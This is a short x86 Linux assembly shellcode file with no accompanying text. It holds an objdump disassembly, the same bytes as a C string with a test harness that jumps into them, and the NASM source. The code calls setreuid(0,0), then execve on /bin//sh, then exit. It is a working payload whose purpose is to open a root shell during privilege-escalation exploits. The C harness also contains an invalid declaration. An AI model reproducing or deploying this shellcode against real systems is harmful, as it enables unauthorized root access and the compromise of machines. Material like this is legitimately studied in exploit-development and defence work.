; 08049000 <_start>:
; 8049000:	31 c0                	xor    eax,eax
; 8049002:	31 db                	xor    ebx,ebx
; 8049004:	29 c9                	sub    ecx,ecx
; 8049006:	31 d2                	xor    edx,edx
; 8049008:	b0 46                	mov    al,0x46
; 804900a:	cd 80                	int    0x80
; 804900c:	31 c0                	xor    eax,eax
; 804900e:	52                   	push   edx
; 804900f:	68 2f 2f 73 68       	push   0x68732f2f
; 8049014:	68 2f 62 69 6e       	push   0x6e69622f
; 8049019:	89 e3                	mov    ebx,esp
; 804901b:	52                   	push   edx
; 804901c:	54                   	push   esp
; 804901d:	89 e1                	mov    ecx,esp
; 804901f:	b0 0b                	mov    al,0xb
; 8049021:	cd 80                	int    0x80
; 8049023:	b0 01                	mov    al,0x1
; 8049025:	30 db                	xor    bl,bl
; 8049027:	cd 80                	int    0x80

;#include <stdio.h>
;
;unsigned char buff[]="\x31\xc0\x31\xdb\x29\xc9\x31\xd2\xb0\x46\xcd\x80\x31\xc0"\
;		      "\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"\
;	              "\x54\x89\xe1\xb0\x0b\xcd\x80\xb0\x01\x30\xdb\xcd\x80";
; int main(void){
;	(int)(*code)();
;	code = (int(*)())buff;
;	code();
; }






[BITS 32]
global _start
_start:
	xor eax,eax
	sub ebx,ebx
	sub ecx,ecx
	xor edx,edx
	mov al,0x46
	int 0x80
	xor eax,eax
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push edx
	push esp
	mov ecx,esp
	mov al,0x0b
	int 0x80

	mov al,1h
	xor bl,bl
	int 80h
